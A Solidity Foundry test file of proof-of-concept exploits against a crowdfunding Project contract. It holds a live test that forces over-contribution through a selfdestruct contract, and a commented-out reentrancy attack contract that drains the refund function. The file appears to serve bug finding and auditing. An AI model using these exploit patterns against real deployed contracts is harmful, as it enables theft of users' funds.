// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/Project.sol";
import "src/ProjectFactory.sol";

contract OpixBugPocs is Test {



    ProjectFactory projectFactory;
    Project project;
    address creator;
    address contributor;
    address hacker;
    function setUp() public {

        projectFactory = new ProjectFactory();
        creator = address(0x1);
        contributor = address(0x2);
        hacker = address(0x3);
        vm.deal(contributor, 150 ether);
        vm.deal(hacker, 1 ether);
        vm.startPrank(creator);
        project = Project(projectFactory.create(100 ether, "Test", "TST"));
        vm.stopPrank();


    }

    function test_OverContribute() public {

        // If a contract selfdestructs into the project, the project,
        // it never gets to update it's goal status, so even if the goal will be achieved by the selfdestruct contract, one more contribution will be allowed, which is against the spec.

        OverContributionContract overContributionContract = new OverContributionContract();
        vm.deal(address(overContributionContract), 100 ether); // Give the contract enough money to selfdestruct into the project, and reach the goal.
        // The contract will selfdestruct into the project, and the project will have 100 ether.
        overContributionContract.destroy(payable(address(project)));

        vm.startPrank(contributor);
        // Contributor can contribute ether, even after the goal is already achieved.
        project.contribute{value: 5 ether}();
        vm.stopPrank();
        console.log("project.balance = ", address(project).balance);
        assertTrue(address(project).balance > 100 ether, "Over contribution failed");
    } 

    // function test_RefundReentrancy() public {
    //     // There is a reentrancy bug in the refund function, since contribution of the sender is set to 0 after the call to the sender, which can reenter into refund. 
    //     vm.deal(address(project), 10 ether); // the amount of ether we will drain from the project


    //     vm.startPrank(hacker);
    //     uint contrib_amt = 0.02 ether;


    //     ReentrancyHackerContract hackerContract = new 
    //     ReentrancyHackerContract(address(project), contrib_amt);

    //     // The hacker first contributed some money when the goal was not failed.
    //     hackerContract.contribute{value: contrib_amt}(); 



    //     vm.warp(block.timestamp +  31 days); // The goal is now failed, so we can call refund. (The hack takes place after this time, so this is not cheating.)

    //     hackerContract.hack();
 

    //     hackerContract.withdraw();
    //     vm.stopPrank();

    //     console.log("hackerContract.balance = ", address(hackerContract).balance);
    //     console.log("hacker.balance = ", address(hacker).balance);

    //     require(address(hacker).balance >= 10 ether, "Reentrancy failed");


    // }


}



// contract ReentrancyHackerContract {
//     Project _victim;
//     uint _contrib_amt;
//     constructor(address victim, uint contrib_amt) {
//         _victim = Project(victim);
//         _contrib_amt = contrib_amt;
//     }
    
//     function contribute() payable external {
//         _victim.contribute{value: _contrib_amt}();
//     }



//     function hack() payable external {

//         _victim.refund();
//     }

//     receive() payable external {
//         if(address(_victim).balance > _contrib_amt)
//             _victim.refund();
//     }

//     function withdraw() external {
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }

contract OverContributionContract{

    function destroy(address payable victim) external {
        selfdestruct(payable(victim));    
    }

}   
